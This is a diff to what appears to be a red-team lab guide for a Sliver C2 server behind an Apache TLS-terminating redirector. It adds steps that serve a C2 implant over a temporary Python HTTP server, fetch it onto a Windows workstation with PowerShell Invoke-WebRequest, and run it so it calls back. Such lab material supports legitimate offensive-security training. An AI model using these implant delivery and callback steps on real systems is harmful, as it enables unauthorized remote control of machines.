@@ -804,7 +804,7 @@ sliver > http --lhost 0.0.0.0 --lport 443
 This starts a plain HTTP listener on port 443. The implant connects over HTTPS to the redirector, which terminates SSL and forwards plain HTTP internally to Sliver on port 443.
 
 > [!TIP]
-> SSL is handled entirely by the Apache redirector — Sliver never sees TLS. Using `http --lport 443` (not `https`) is correct here because the redirector strips TLS before forwarding traffic into the VPC. The implant's callback URL is still `https://yourdomain/...` so from the target's perspective all traffic is encrypted.
+> SSL is handled entirely by the Apache redirector, Sliver never sees TLS. Using `http --lport 443` (not `https`) is correct here because the redirector strips TLS before forwarding traffic into the VPC. The implant's callback URL is still `https://yourdomain/...` so from the target's perspective all traffic is encrypted.
 
 **Checkpoint:** ✅ Sliver HTTP listener running on port 443
 
@@ -821,7 +821,23 @@ Replace `<YOUR_DOMAIN>` with your `redirector_domain` value from `terraform.tfva
 > [!NOTE]
 > The implant must also send the `X-Request-ID` header with the correct token value. Configure this in the Sliver HTTP C2 profile or use Sliver's `--header` flag if available.
 
-Transfer the implant to the Windows workstation and execute it. You should see a new session appear in the Sliver console.
+**Transfer the implant to the Windows workstation:**
+
+Exit or background the Sliver console and start a temporary HTTP server on Sliver:
+
+```bash
+cd /tmp && python3 -m http.server 8080
+```
+
+Then on the Windows operator machine (PowerShell):
+
+```powershell
+Invoke-WebRequest http://sliver:8080/implant.exe -OutFile C:\Users\operator\Desktop\implant.exe
+```
+
+The `sliver` hostname resolves automatically via `/etc/hosts` on all lab machines. When the transfer is complete, stop the HTTP server with `Ctrl+C` and relaunch the Sliver console with `sudo /root/sliver-server`.
+
+Execute the implant on the Windows workstation. You should see a new session appear in the Sliver console.
 
 **Checkpoint:** ✅ Sliver implant calling back through redirector
 
